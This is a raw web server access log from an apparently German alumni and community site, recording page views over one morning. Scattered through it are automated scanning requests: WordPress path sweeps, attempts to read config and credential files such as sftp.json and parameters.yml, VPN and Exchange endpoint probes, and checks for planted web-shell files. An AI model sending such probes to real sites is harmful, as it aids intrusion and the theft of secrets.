4d5353815b37268c5b44cfa80e814a81d49b93cd18155f29be362b33eaba445c;2025-11-25 04:47:01;;/htmx/get;GET;405
95adb14617c2c2d58e416757323074db7d92427d72e5785afd85827df32dc46f;2025-11-25 04:47:06;;/unsubscribe;GET;302
4d5353815b37268c5b44cfa80e814a81d49b93cd18155f29be362b33eaba445c;2025-11-25 04:47:31;;/htmx/get;GET;405
a6a505994c8728747f54021d88b6459fca7e829e432a4dcb4eeaf4088a25e7db;2025-11-25 04:49:22;;/;GET;200
a6a505994c8728747f54021d88b6459fca7e829e432a4dcb4eeaf4088a25e7db;2025-11-25 04:49:32;;/;GET;200
60a3b8a34de89a248b264a70196cc84d57bf76418a2ece95a1d05927134245d3;2025-11-25 04:53:41;;/;GET;200
4d4559860ebe13cf6a03d2b1ce66e25fcdb8c1bc42c34b4a8cf0a52d32bd2e0a;2025-11-25 04:57:34;;/;GET;200
07a9f464d7e7ce196cd7e854d9b15d107cd72407f52243deb2c242e14fb63d8f;2025-11-25 04:59:50;;/aktuelles/stellenangebote;GET;200
cf525f140094ccf621ba2aeedb7039d2a9dbea7232bab7a7fdf0f0a65fd6baa5;2025-11-25 05:05:34;;/;GET;200
755f8aef7e2f37ee28b827a53461b982b70f576421295bc0183279e37ade5663;2025-11-25 05:20:44;;/;GET;200
f986f0faa45750b85ba686905f0e5053922871f996c68fcfd659e46a67f235a3;2025-11-25 05:32:09;;/ecp/Current/exporttool/microsoft.exchange.ediscovery.exporttool.application;GET;404
ea4d506d83a385cdefa7246b64e26097cdff76b668f5a1dda5ef977e84fa0170;2025-11-25 05:35:00;;/themen/details/abschied-aus-moabit;GET;200
8e43f7e6e013898e064b2fa283e675845f3d7b583d2dabc94b312afc8e56dcb5;2025-11-25 05:49:29;;/;GET;200
8e43f7e6e013898e064b2fa283e675845f3d7b583d2dabc94b312afc8e56dcb5;2025-11-25 05:49:29;;//wp-includes/wlwmanifest.xml;GET;404
8e43f7e6e013898e064b2fa283e675845f3d7b583d2dabc94b312afc8e56dcb5;2025-11-25 05:49:30;;//xmlrpc.php?rsd;GET;404
8e43f7e6e013898e064b2fa283e675845f3d7b583d2dabc94b312afc8e56dcb5;2025-11-25 05:49:30;;/;GET;200
8e43f7e6e013898e064b2fa283e675845f3d7b583d2dabc94b312afc8e56dcb5;2025-11-25 05:49:30;;//blog/wp-includes/wlwmanifest.xml;GET;404
8e43f7e6e013898e064b2fa283e675845f3d7b583d2dabc94b312afc8e56dcb5;2025-11-25 05:49:30;;//web/wp-includes/wlwmanifest.xml;GET;404
8e43f7e6e013898e064b2fa283e675845f3d7b583d2dabc94b312afc8e56dcb5;2025-11-25 05:49:31;;//wordpress/wp-includes/wlwmanifest.xml;GET;404
8e43f7e6e013898e064b2fa283e675845f3d7b583d2dabc94b312afc8e56dcb5;2025-11-25 05:49:31;;//website/wp-includes/wlwmanifest.xml;GET;404
8e43f7e6e013898e064b2fa283e675845f3d7b583d2dabc94b312afc8e56dcb5;2025-11-25 05:49:31;;//wp/wp-includes/wlwmanifest.xml;GET;404
8e43f7e6e013898e064b2fa283e675845f3d7b583d2dabc94b312afc8e56dcb5;2025-11-25 05:49:31;;//news/wp-includes/wlwmanifest.xml;GET;404
8e43f7e6e013898e064b2fa283e675845f3d7b583d2dabc94b312afc8e56dcb5;2025-11-25 05:49:32;;//2018/wp-includes/wlwmanifest.xml;GET;404
8e43f7e6e013898e064b2fa283e675845f3d7b583d2dabc94b312afc8e56dcb5;2025-11-25 05:49:32;;//2019/wp-includes/wlwmanifest.xml;GET;404
8e43f7e6e013898e064b2fa283e675845f3d7b583d2dabc94b312afc8e56dcb5;2025-11-25 05:49:32;;//shop/wp-includes/wlwmanifest.xml;GET;404
8e43f7e6e013898e064b2fa283e675845f3d7b583d2dabc94b312afc8e56dcb5;2025-11-25 05:49:32;;//wp1/wp-includes/wlwmanifest.xml;GET;404
8e43f7e6e013898e064b2fa283e675845f3d7b583d2dabc94b312afc8e56dcb5;2025-11-25 05:49:33;;//test/wp-includes/wlwmanifest.xml;GET;404
8e43f7e6e013898e064b2fa283e675845f3d7b583d2dabc94b312afc8e56dcb5;2025-11-25 05:49:33;;//media/wp-includes/wlwmanifest.xml;GET;404
8e43f7e6e013898e064b2fa283e675845f3d7b583d2dabc94b312afc8e56dcb5;2025-11-25 05:49:33;;//wp2/wp-includes/wlwmanifest.xml;GET;404
8e43f7e6e013898e064b2fa283e675845f3d7b583d2dabc94b312afc8e56dcb5;2025-11-25 05:49:33;;//site/wp-includes/wlwmanifest.xml;GET;404
8e43f7e6e013898e064b2fa283e675845f3d7b583d2dabc94b312afc8e56dcb5;2025-11-25 05:49:34;;//cms/wp-includes/wlwmanifest.xml;GET;404
8e43f7e6e013898e064b2fa283e675845f3d7b583d2dabc94b312afc8e56dcb5;2025-11-25 05:49:34;;//sito/wp-includes/wlwmanifest.xml;GET;404
c5a9fee80ff30cbdb6aeb19d70d1a738aaf35549b26ed00361d53d3d166f898a;2025-11-25 06:05:36;;/media/cache/post_thumbnail/images/blogpost/pexels-karolina-grabowska-8107761-1741718125.jpg;GET;404
07a2bc25b91d6c41bc29e4033d4c452fa2318dfa68773c110e0acfe92f8a6a67;2025-11-25 06:08:15;;/;GET;200
eaf3929111d2de7e855add8180f61f75f75810d34a2345bcbfc5032fe0bef8ef;2025-11-25 06:13:57;;/;GET;200
eaf3929111d2de7e855add8180f61f75f75810d34a2345bcbfc5032fe0bef8ef;2025-11-25 06:14:02;;/;GET;200
eaf3929111d2de7e855add8180f61f75f75810d34a2345bcbfc5032fe0bef8ef;2025-11-25 06:14:12;;/.DS_Store;GET;404
eaf3929111d2de7e855add8180f61f75f75810d34a2345bcbfc5032fe0bef8ef;2025-11-25 06:14:13;;/.vscode/sftp.json;GET;404
eaf3929111d2de7e855add8180f61f75f75810d34a2345bcbfc5032fe0bef8ef;2025-11-25 06:14:14;;/phpinfo.php;GET;404
eaf3929111d2de7e855add8180f61f75f75810d34a2345bcbfc5032fe0bef8ef;2025-11-25 06:14:15;;/info.php;GET;404
eaf3929111d2de7e855add8180f61f75f75810d34a2345bcbfc5032fe0bef8ef;2025-11-25 06:14:16;;/idx_config/;GET;404
eaf3929111d2de7e855add8180f61f75f75810d34a2345bcbfc5032fe0bef8ef;2025-11-25 06:14:18;;/_profiler/open?file=config/parameters.yml;GET;404
eaf3929111d2de7e855add8180f61f75f75810d34a2345bcbfc5032fe0bef8ef;2025-11-25 06:14:19;;/config.json;GET;404
eaf3929111d2de7e855add8180f61f75f75810d34a2345bcbfc5032fe0bef8ef;2025-11-25 06:14:19;;/;UNKNOWN;405
eaf3929111d2de7e855add8180f61f75f75810d34a2345bcbfc5032fe0bef8ef;2025-11-25 06:14:20;;/app_dev.php/_profiler/open?file=config/parameters.yml;GET;404
eaf3929111d2de7e855add8180f61f75f75810d34a2345bcbfc5032fe0bef8ef;2025-11-25 06:14:21;;/debug/default/view?panel=config;GET;404
eaf3929111d2de7e855add8180f61f75f75810d34a2345bcbfc5032fe0bef8ef;2025-11-25 06:14:23;;/server-status;GET;404
eaf3929111d2de7e855add8180f61f75f75810d34a2345bcbfc5032fe0bef8ef;2025-11-25 06:14:24;;/_profiler/phpinfo;GET;404
eaf3929111d2de7e855add8180f61f75f75810d34a2345bcbfc5032fe0bef8ef;2025-11-25 06:14:25;;/phpinfo;GET;404
eaf3929111d2de7e855add8180f61f75f75810d34a2345bcbfc5032fe0bef8ef;2025-11-25 06:14:26;;/telescope/requests;GET;404
8ed98f351d170b944e1fab2f89a2b7c07184f91dc81e31b18966a33bd620cb01;2025-11-25 06:17:11;;/;GET;200
3d26b1ba38a2b067d2d9cdb27e80b45e14a75bdb972c7e2a4a340184077f948f;2025-11-25 06:20:56;;/;GET;200
da2c52833197dfa23769515cce8e28bb0669d2cb85c8c765e2f9d5925e41c6e2;2025-11-25 06:21:17;;/;GET;200
407d514275c6a4ac11426289717cd074d5e02ba282fe91f4f27657d8ce7a6e18;2025-11-25 06:22:08;;/gruppen/hobby/teamsportarten;GET;302
02e2f1393eb797f954fde586da58e8b3b44e5dbdecaba0160b1020eba89f1e91;2025-11-25 06:29:43;;/?XDEBUG_SESSION_START=phpstorm;GET;200
0f05ced56245bfcaad57cca7c268c060d48f90d985e66935cf94bea1d9603b7a;2025-11-25 06:30:59;/;/;GET;200
ea2daa15ff92b4d537aa803edf5a10788166b63a082d72396164b245203a49cd;2025-11-25 06:31:29;/;/;GET;200
9ba2b4ea72b222c7e6a679670752d934b98affe499d8b99a43f58333663100b9;2025-11-25 06:32:01;/wsman;/wsman;GET;404
daef66e636eb2e6eb8fdde4583f1e82e4a4574db40ddb81b3504bd52518da97e;2025-11-25 06:32:31;/;/;GET;200
daef66e636eb2e6eb8fdde4583f1e82e4a4574db40ddb81b3504bd52518da97e;2025-11-25 06:32:32;/auth.html;/auth.html;GET;404
daef66e636eb2e6eb8fdde4583f1e82e4a4574db40ddb81b3504bd52518da97e;2025-11-25 06:32:33;/auth1.html;/auth1.html;GET;404
daef66e636eb2e6eb8fdde4583f1e82e4a4574db40ddb81b3504bd52518da97e;2025-11-25 06:32:33;/sslvpnLogin.html;/sslvpnLogin.html;GET;404
daef66e636eb2e6eb8fdde4583f1e82e4a4574db40ddb81b3504bd52518da97e;2025-11-25 06:32:34;/api/sonicos/auth;/api/sonicos/auth;GET;404
daef66e636eb2e6eb8fdde4583f1e82e4a4574db40ddb81b3504bd52518da97e;2025-11-25 06:32:34;/api/sonicos/tfa;/api/sonicos/tfa;GET;404
c7d22af7871562cad20da9e81beaa2981c54ffdcc2187e2b42ea14e479da846f;2025-11-25 06:33:06;;/;GET;200
c7d22af7871562cad20da9e81beaa2981c54ffdcc2187e2b42ea14e479da846f;2025-11-25 06:39:56;;/;GET;200
cbb74a4970d9bb6238673e34303ccbe5c60f31eaed89861065ea6a41abcc65e7;2025-11-25 06:47:01;;/;GET;200
5604d377d4094951a6cf0f5230fabf8e5a3dc814de21503b097406b2738dbde2;2025-11-25 06:50:17;;/;GET;200
6bccd29d0a80eae32a259f536f37747210ebd430c3d9916ea64119a72403fa33;2025-11-25 06:59:28;;/;GET;200
094e6b480537ae099b0f7926c41735b5bb82b50185bb51fe43afa1bef330ff96;2025-11-25 07:07:20;;/;GET;200
2fd757c31ae6606c441c8e3fc0c27db20e18227f8831656b7677ee0b5b46c991;2025-11-25 07:08:32;;/;GET;200
b6a0a73bc98489a39b63ac1cde69dd0fd2673406f92467b4a2174559f9569574;2025-11-25 07:10:18;;/rechtliches/nutzungsbedingungen;GET;200
51e350fcc28b84adb205c447e954d1007c60043934fac87c0690724955adf92f;2025-11-25 07:18:43;;/;GET;200
ee8f1cc8e9a2a500dd49d2485f97114140ad790ecc38c362e921f767d271142b;2025-11-25 07:22:24;;/;GET;200
8583b6da3f10a94565386889432403fafe4a2b4813e30bb3b0a513a2422bd982;2025-11-25 07:22:31;;/ab2g;GET;404
8583b6da3f10a94565386889432403fafe4a2b4813e30bb3b0a513a2422bd982;2025-11-25 07:22:31;;/ab2h;GET;404
8583b6da3f10a94565386889432403fafe4a2b4813e30bb3b0a513a2422bd982;2025-11-25 07:22:31;;/alive.php;GET;404
8583b6da3f10a94565386889432403fafe4a2b4813e30bb3b0a513a2422bd982;2025-11-25 07:22:32;;/;GET;200
8583b6da3f10a94565386889432403fafe4a2b4813e30bb3b0a513a2422bd982;2025-11-25 07:22:32;;/;GET;200
8583b6da3f10a94565386889432403fafe4a2b4813e30bb3b0a513a2422bd982;2025-11-25 07:22:32;;/teorema505?t=1;GET;404
ebf07fbebbaf6b18ab7315bd48406b44ebb680ff7b450ac2384d3d10ba97d3cb;2025-11-25 07:28:31;/gruppen/hobby/musikinstrumente-spielen;/profile;GET;302
ebf07fbebbaf6b18ab7315bd48406b44ebb680ff7b450ac2384d3d10ba97d3cb;2025-11-25 07:28:32;/gruppen/hobby/musikinstrumente-spielen;/login;GET;200
c6f815cf1e24e7ddcf8d6056d055713d865fe1a6293f635144731c9dfc09f9e5;2025-11-25 07:29:55;/gruppen/hobby/musikinstrumente-spielen;/gruppen/hobby/statistik;GET;302
c6f815cf1e24e7ddcf8d6056d055713d865fe1a6293f635144731c9dfc09f9e5;2025-11-25 07:29:56;/gruppen/hobby/musikinstrumente-spielen;/gruppen;GET;200
2703f8782fc80dfa734b07527b690df1099bbb1c2176cccbddf18f05feee8cb1;2025-11-25 07:32:58;;/;GET;200
024526d69a5daf2912616bec62d04b83b64ff48a35f620e64089904f0aca936e;2025-11-25 07:39:22;;/;GET;200
92394453b02b4f8efb5e561f19ee6b51f2847a80761170f558e60d5a0685395b;2025-11-25 07:43:40;;/;GET;200
fff78639dc4db5ae5a7b469a0e0f4f53425d67c4eeeb4473b78b3c2d419aff32;2025-11-25 07:49:46;;/;GET;200
06c50e8a5afc37ef2ff33c6327e98eb15392d84cf790f075c95a1f764ec6936c;2025-11-25 07:49:59;;/;GET;200
bd94088bdee6771deb280429fb10507ce01233da510faa67ebb3d2d14e22e491;2025-11-25 07:57:59;/gruppen/hobby/musikinstrumente-spielen;/gruppen/hobby/robotik;GET;302
bd94088bdee6771deb280429fb10507ce01233da510faa67ebb3d2d14e22e491;2025-11-25 07:58:00;/gruppen/hobby/musikinstrumente-spielen;/gruppen;GET;200
937055fd85df3305ccbf16fdda9ae2b89db4d2699f49af2334d5c860de8b2e31;2025-11-25 08:04:00;;/;GET;200
937055fd85df3305ccbf16fdda9ae2b89db4d2699f49af2334d5c860de8b2e31;2025-11-25 08:04:01;;//wp-includes/wlwmanifest.xml;GET;404
937055fd85df3305ccbf16fdda9ae2b89db4d2699f49af2334d5c860de8b2e31;2025-11-25 08:04:01;;//xmlrpc.php?rsd;GET;404
937055fd85df3305ccbf16fdda9ae2b89db4d2699f49af2334d5c860de8b2e31;2025-11-25 08:04:01;;/;GET;200
937055fd85df3305ccbf16fdda9ae2b89db4d2699f49af2334d5c860de8b2e31;2025-11-25 08:04:01;;//blog/wp-includes/wlwmanifest.xml;GET;404
937055fd85df3305ccbf16fdda9ae2b89db4d2699f49af2334d5c860de8b2e31;2025-11-25 08:04:02;;//web/wp-includes/wlwmanifest.xml;GET;404
937055fd85df3305ccbf16fdda9ae2b89db4d2699f49af2334d5c860de8b2e31;2025-11-25 08:04:02;;//wordpress/wp-includes/wlwmanifest.xml;GET;404
937055fd85df3305ccbf16fdda9ae2b89db4d2699f49af2334d5c860de8b2e31;2025-11-25 08:04:02;;//website/wp-includes/wlwmanifest.xml;GET;404
937055fd85df3305ccbf16fdda9ae2b89db4d2699f49af2334d5c860de8b2e31;2025-11-25 08:04:03;;//wp/wp-includes/wlwmanifest.xml;GET;404
937055fd85df3305ccbf16fdda9ae2b89db4d2699f49af2334d5c860de8b2e31;2025-11-25 08:04:04;;//news/wp-includes/wlwmanifest.xml;GET;404
937055fd85df3305ccbf16fdda9ae2b89db4d2699f49af2334d5c860de8b2e31;2025-11-25 08:04:04;;//2018/wp-includes/wlwmanifest.xml;GET;404
937055fd85df3305ccbf16fdda9ae2b89db4d2699f49af2334d5c860de8b2e31;2025-11-25 08:04:05;;//2019/wp-includes/wlwmanifest.xml;GET;404
937055fd85df3305ccbf16fdda9ae2b89db4d2699f49af2334d5c860de8b2e31;2025-11-25 08:04:05;;//shop/wp-includes/wlwmanifest.xml;GET;404
937055fd85df3305ccbf16fdda9ae2b89db4d2699f49af2334d5c860de8b2e31;2025-11-25 08:04:05;;//wp1/wp-includes/wlwmanifest.xml;GET;404
937055fd85df3305ccbf16fdda9ae2b89db4d2699f49af2334d5c860de8b2e31;2025-11-25 08:04:06;;//test/wp-includes/wlwmanifest.xml;GET;404
937055fd85df3305ccbf16fdda9ae2b89db4d2699f49af2334d5c860de8b2e31;2025-11-25 08:04:06;;//media/wp-includes/wlwmanifest.xml;GET;404
937055fd85df3305ccbf16fdda9ae2b89db4d2699f49af2334d5c860de8b2e31;2025-11-25 08:04:06;;//wp2/wp-includes/wlwmanifest.xml;GET;404
937055fd85df3305ccbf16fdda9ae2b89db4d2699f49af2334d5c860de8b2e31;2025-11-25 08:04:07;;//site/wp-includes/wlwmanifest.xml;GET;404
937055fd85df3305ccbf16fdda9ae2b89db4d2699f49af2334d5c860de8b2e31;2025-11-25 08:04:07;;//cms/wp-includes/wlwmanifest.xml;GET;404
937055fd85df3305ccbf16fdda9ae2b89db4d2699f49af2334d5c860de8b2e31;2025-11-25 08:04:08;;//sito/wp-includes/wlwmanifest.xml;GET;404
d85acac0f0b35f137fd29e5e561c6cd4de2825eaccd415e14d9e9d12a7afc21f;2025-11-25 08:04:19;/;/personen/alumni/schule/09A05;GET;200
17da33d94f35d898b7a7f1329d7a35ff2a56a70ad671dcf46938d233a2ffa450;2025-11-25 08:07:12;;/;GET;200
f60a1195a54ff55ac800c733611cd187edd86510c8d04f35cb1c26c959bcd42e;2025-11-25 08:15:39;;/veranstaltungen/details/sommerfest-am-treptow-kolleg;GET;200
bd94088bdee6771deb280429fb10507ce01233da510faa67ebb3d2d14e22e491;2025-11-25 08:20:07;/gruppen/hobby/musikinstrumente-spielen;/rechtliches/green-data;GET;200
fed61cc13a9ae4302fd85aca18ffa184c5d6f14031d9bdbdfa4979ae2fa25539;2025-11-25 08:34:15;;/;GET;200
5f5a2972993689ef09f7f7e2cb0c44e6abb0e776a8776cbba3f1cb0d6822c7a1;2025-11-25 08:36:17;;/;GET;200
02e2f1393eb797f954fde586da58e8b3b44e5dbdecaba0160b1020eba89f1e91;2025-11-25 08:36:55;;/actuator/gateway/routes;GET;404
5d805f0740041f39c329cf9634ba9cd4c8175fc53fbc96efc6594037872bc198;2025-11-25 08:37:04;/gruppen/hobby/nahen-und-textilarbeiten;/gruppen/hobby/kreatives-schreiben;GET;302
5d805f0740041f39c329cf9634ba9cd4c8175fc53fbc96efc6594037872bc198;2025-11-25 08:37:05;/gruppen/hobby/nahen-und-textilarbeiten;/gruppen;GET;200
746bef84abb3052e895b0816d43688916a1152f681e21d2cfbd3729c6e9bae39;2025-11-25 08:46:00;;/;GET;200
746bef84abb3052e895b0816d43688916a1152f681e21d2cfbd3729c6e9bae39;2025-11-25 08:46:01;;/;GET;200
23c747c26d9f122e0e1654fcb547c3a7f078e0cb0c6f2f565175d0a1ab9d196d;2025-11-25 08:47:51;;/;GET;200
54716ea857c4d0797dd52293a25964df0b49561a1dd5e4a590b625f26aec3160;2025-11-25 08:51:27;;/aktuelles/stellenangebote;GET;200
66f38ba5bded8243c1250c2212235e65072da331be823192e067c40e4d036754;2025-11-25 08:54:23;;/themen/details/wenn-sicherheit-sichtbar-wird;GET;200
5819a15a0250a4be30ad721e403fa64f427a91ac2f2b26dcdfdd2b812199edbc;2025-11-25 08:56:00;;/aktuelles/meldungen/details/start-der-open-beta-jetzt-anmelden-und-testen;GET;200
56c00389a9884a04b2c3c1fd6eafd9d14a3de8ce0f683c4452f0f2eb47aa9dd2;2025-11-25 09:00:32;/personen/alumni/details/jeanette-stephan;/personen/alumni/details/jeanette-stephan;GET;200
9fb41a111a7583422e066521d5bf29ad592b12a22e9f2e3d37db940781a75ffe;2025-11-25 09:02:01;/personen/all/5;/personen/alumni/details/jana-zenker;GET;200
9fb41a111a7583422e066521d5bf29ad592b12a22e9f2e3d37db940781a75ffe;2025-11-25 09:03:19;/gruppen/hobby/musikinstrumente-spielen;/personen/alumni/schule/67945;GET;200
ac4c6364323be717b6e950c2240362f34ea0c3d007700d55555be0b088feaed9;2025-11-25 09:04:26;;/;GET;200
242d0e9c32a13c08b150da7dbb44be25c356892ea858b72d633d3daa723c1104;2025-11-25 09:04:42;/personen/alumni/details/benjamin-voigt;/personen/alumni/details/benjamin-voigt;GET;200
bf060ca759f5f4d77c567c4a2d43af785a5868dfa1ea08c210cd4509131e92cd;2025-11-25 09:05:14;/;/;GET;200
ca4a168e1edc0771b5ccf9d18f078b2ec5f83d9c86a7d8728914f97e66d49412;2025-11-25 09:05:34;/sitemap.xml;/sitemap.xml;GET;200
5d805f0740041f39c329cf9634ba9cd4c8175fc53fbc96efc6594037872bc198;2025-11-25 09:06:04;/gruppen/hobby/musikinstrumente-spielen;/gruppen/hobby/philosophie;GET;302
5d805f0740041f39c329cf9634ba9cd4c8175fc53fbc96efc6594037872bc198;2025-11-25 09:06:05;/gruppen/hobby/musikinstrumente-spielen;/gruppen;GET;200
651fae04f320ffcd181dba217348390f6f1754e3b6c35d0cb59fb4516aa825a3;2025-11-25 09:07:33;;/rechtliches/impressum;GET;200
651fae04f320ffcd181dba217348390f6f1754e3b6c35d0cb59fb4516aa825a3;2025-11-25 09:07:34;;/;GET;200
651fae04f320ffcd181dba217348390f6f1754e3b6c35d0cb59fb4516aa825a3;2025-11-25 09:07:38;;/personen/alumni/schule/0351;GET;200
651fae04f320ffcd181dba217348390f6f1754e3b6c35d0cb59fb4516aa825a3;2025-11-25 09:07:38;;/profile;GET;302
651fae04f320ffcd181dba217348390f6f1754e3b6c35d0cb59fb4516aa825a3;2025-11-25 09:07:38;;/veranstaltungen;GET;200
651fae04f320ffcd181dba217348390f6f1754e3b6c35d0cb59fb4516aa825a3;2025-11-25 09:07:38;;/personen;GET;200
651fae04f320ffcd181dba217348390f6f1754e3b6c35d0cb59fb4516aa825a3;2025-11-25 09:07:38;;/personen/alumni/schule/0350;GET;200
651fae04f320ffcd181dba217348390f6f1754e3b6c35d0cb59fb4516aa825a3;2025-11-25 09:07:38;;/rechtliches/green-data;GET;200
651fae04f320ffcd181dba217348390f6f1754e3b6c35d0cb59fb4516aa825a3;2025-11-25 09:07:38;;/gruppen;GET;200
651fae04f320ffcd181dba217348390f6f1754e3b6c35d0cb59fb4516aa825a3;2025-11-25 09:07:38;;/personen/alumni/schule/BW001;GET;200
651fae04f320ffcd181dba217348390f6f1754e3b6c35d0cb59fb4516aa825a3;2025-11-25 09:07:38;;/personen/alumni/schule/HS001;GET;200
651fae04f320ffcd181dba217348390f6f1754e3b6c35d0cb59fb4516aa825a3;2025-11-25 09:07:38;;/personen/alumni/schule/03A04;GET;200
651fae04f320ffcd181dba217348390f6f1754e3b6c35d0cb59fb4516aa825a3;2025-11-25 09:07:38;;/personen/alumni/schule/4240628;GET;200
651fae04f320ffcd181dba217348390f6f1754e3b6c35d0cb59fb4516aa825a3;2025-11-25 09:07:38;;/personen/alumni/schule/HS002;GET;200
651fae04f320ffcd181dba217348390f6f1754e3b6c35d0cb59fb4516aa825a3;2025-11-25 09:07:38;;/personen/alumni/schule/0349;GET;200
651fae04f320ffcd181dba217348390f6f1754e3b6c35d0cb59fb4516aa825a3;2025-11-25 09:07:38;;/personen/alumni/schule/40745;GET;200
651fae04f320ffcd181dba217348390f6f1754e3b6c35d0cb59fb4516aa825a3;2025-11-25 09:07:38;;/personen/alumni/schule/4540118;GET;200
651fae04f320ffcd181dba217348390f6f1754e3b6c35d0cb59fb4516aa825a3;2025-11-25 09:07:38;;/personen/alumni/schule/SHH001;GET;200
651fae04f320ffcd181dba217348390f6f1754e3b6c35d0cb59fb4516aa825a3;2025-11-25 09:07:38;;/about/allgemein;GET;200
651fae04f320ffcd181dba217348390f6f1754e3b6c35d0cb59fb4516aa825a3;2025-11-25 09:07:38;;/aktuelles/meldungen;GET;200
651fae04f320ffcd181dba217348390f6f1754e3b6c35d0cb59fb4516aa825a3;2025-11-25 09:07:38;;/rechtliches/datenschutz;GET;200
651fae04f320ffcd181dba217348390f6f1754e3b6c35d0cb59fb4516aa825a3;2025-11-25 09:07:38;;/personen/alumni/schule/4440541;GET;200
651fae04f320ffcd181dba217348390f6f1754e3b6c35d0cb59fb4516aa825a3;2025-11-25 09:07:38;;/rechtliches/nutzungsbedingungen;GET;200
651fae04f320ffcd181dba217348390f6f1754e3b6c35d0cb59fb4516aa825a3;2025-11-25 09:07:38;;/login;GET;200
651fae04f320ffcd181dba217348390f6f1754e3b6c35d0cb59fb4516aa825a3;2025-11-25 09:07:38;;/personen/alumni/schule/01A04;GET;200
651fae04f320ffcd181dba217348390f6f1754e3b6c35d0cb59fb4516aa825a3;2025-11-25 09:07:39;;/personen/alumni/schule/0348;GET;200
5f71559d4ce55009c31ec32400ad8f0808fdddb4cb2db7c3b675d2be190358ef;2025-11-25 09:09:36;;/;GET;200
2b245c20a74ee9d8a45dc50958792cc0c86209960e84aee1a1d05f6d92756f62;2025-11-25 09:10:17;;/sitemap.xml;GET;200
25b5861a4de08ba056b47ee3b6b9d86e60af0912d1dbb6d031d018bcc083bfef;2025-11-25 09:10:27;;/config.json;GET;404
ebf07fbebbaf6b18ab7315bd48406b44ebb680ff7b450ac2384d3d10ba97d3cb;2025-11-25 09:26:08;/gruppen/hobby/musikinstrumente-spielen;/personen/alumni/schule/65286;GET;200
ae89e10e78bf2c3944b34de02275b6d065a9ab9012bd639237cae7d1fe4be322;2025-11-25 09:29:27;;/themen/details/abschied-aus-moabit;GET;200
5604d377d4094951a6cf0f5230fabf8e5a3dc814de21503b097406b2738dbde2;2025-11-25 09:36:33;;/;GET;200
ab4c4a7d2d44cef82ce059e16fe7461fb2d46ce24e330fd08023660d94d29d62;2025-11-25 09:41:33;;/reset-password/check-email;GET;200
d9bec6cab084b4235de8f09e4410dc7115977a3d4e0984541856f745ea76591e;2025-11-25 09:43:05;;/;GET;200
6c7cbda7ee584685f46b25f260010a044c89b8c16ecc4ba5535c50b6839a0e11;2025-11-25 09:52:10;;/?page=docs-sql;GET;200
95bc20bbc1dacaa1c75d01fc2650707a1c983fd9cddaeaa649238d0351148ea2;2025-11-25 09:57:29;/;/;GET;200
9848721278c322723fb490d875f7a6fe02087753abbc23ec35875ef817ce4622;2025-11-25 10:08:49;;/;GET;200
16524dc5186b411ac441ef74eb779e2f3007bc44eedc248c71dad0672ff881c8;2025-11-25 10:13:09;;/;GET;200
d9bec6cab084b4235de8f09e4410dc7115977a3d4e0984541856f745ea76591e;2025-11-25 10:14:58;;/;GET;200
46a256bad355735bd0a910a71608a4983b212bf73fbf8fc182ea56d4a7706463;2025-11-25 10:27:26;;/;GET;200
26e9b35487bf17d8ce6a9b900c5083c1cb95725c9f022107846e2184fdf11c2c;2025-11-25 10:32:29;;/wp-login.php?action=register;GET;404
f64737f4c8212b3d3007c9ad63c2ed9a183a616b1051ad2b1ca4502a142f560e;2025-11-25 10:36:32;;/wp-login.php;GET;404
f64737f4c8212b3d3007c9ad63c2ed9a183a616b1051ad2b1ca4502a142f560e;2025-11-25 10:36:32;;/wp-login.php;GET;404
f64737f4c8212b3d3007c9ad63c2ed9a183a616b1051ad2b1ca4502a142f560e;2025-11-25 10:36:33;;/wp-admin/;GET;404
b5b1252f6095437125e58bff2e8c156b50f3ac6a231d8d3538ddc092463e9524;2025-11-25 10:40:29;/;/;GET;200
d88a40218f9e07082956c32ce75666cd8b1661446582a3f4ff3c574c11d61cae;2025-11-25 10:42:33;;/wp-content/plugins/hellopress/wp_filemanager.php;GET;404
d88a40218f9e07082956c32ce75666cd8b1661446582a3f4ff3c574c11d61cae;2025-11-25 10:42:34;;/class-t.api.php;GET;404
d88a40218f9e07082956c32ce75666cd8b1661446582a3f4ff3c574c11d61cae;2025-11-25 10:42:35;;/zwso.php;GET;404
d88a40218f9e07082956c32ce75666cd8b1661446582a3f4ff3c574c11d61cae;2025-11-25 10:42:35;;/wp-admin/css/colors/blue/index.php;GET;404
d88a40218f9e07082956c32ce75666cd8b1661446582a3f4ff3c574c11d61cae;2025-11-25 10:42:36;;/admin.php?p=;GET;404
d88a40218f9e07082956c32ce75666cd8b1661446582a3f4ff3c574c11d61cae;2025-11-25 10:42:36;;/randkeyword.php;GET;404
d88a40218f9e07082956c32ce75666cd8b1661446582a3f4ff3c574c11d61cae;2025-11-25 10:42:37;;/fwe.php;GET;404
d88a40218f9e07082956c32ce75666cd8b1661446582a3f4ff3c574c11d61cae;2025-11-25 10:42:37;;/images/m.php;GET;404
d88a40218f9e07082956c32ce75666cd8b1661446582a3f4ff3c574c11d61cae;2025-11-25 10:42:38;;/sko.php;GET;404
d88a40218f9e07082956c32ce75666cd8b1661446582a3f4ff3c574c11d61cae;2025-11-25 10:42:39;;/tx1.php;GET;404
d88a40218f9e07082956c32ce75666cd8b1661446582a3f4ff3c574c11d61cae;2025-11-25 10:42:39;;/xv.php;GET;404
d88a40218f9e07082956c32ce75666cd8b1661446582a3f4ff3c574c11d61cae;2025-11-25 10:42:40;;/x56.php;GET;404
d88a40218f9e07082956c32ce75666cd8b1661446582a3f4ff3c574c11d61cae;2025-11-25 10:42:40;;/htaccess.php;GET;404
d88a40218f9e07082956c32ce75666cd8b1661446582a3f4ff3c574c11d61cae;2025-11-25 10:42:41;;/readme.php;GET;404
d88a40218f9e07082956c32ce75666cd8b1661446582a3f4ff3c574c11d61cae;2025-11-25 10:42:41;;/Cok.php;GET;404
d88a40218f9e07082956c32ce75666cd8b1661446582a3f4ff3c574c11d61cae;2025-11-25 10:42:42;;/x50.php;GET;404
d88a40218f9e07082956c32ce75666cd8b1661446582a3f4ff3c574c11d61cae;2025-11-25 10:42:42;;/ot.php;GET;404
d88a40218f9e07082956c32ce75666cd8b1661446582a3f4ff3c574c11d61cae;2025-11-25 10:42:43;;/fv.php;GET;404
d88a40218f9e07082956c32ce75666cd8b1661446582a3f4ff3c574c11d61cae;2025-11-25 10:42:43;;/lx.php;GET;404
d88a40218f9e07082956c32ce75666cd8b1661446582a3f4ff3c574c11d61cae;2025-11-25 10:42:44;;/w1w.php;GET;404
d88a40218f9e07082956c32ce75666cd8b1661446582a3f4ff3c574c11d61cae;2025-11-25 10:42:45;;/cafe.php;GET;404
d88a40218f9e07082956c32ce75666cd8b1661446582a3f4ff3c574c11d61cae;2025-11-25 10:42:45;;/ww2.php;GET;404
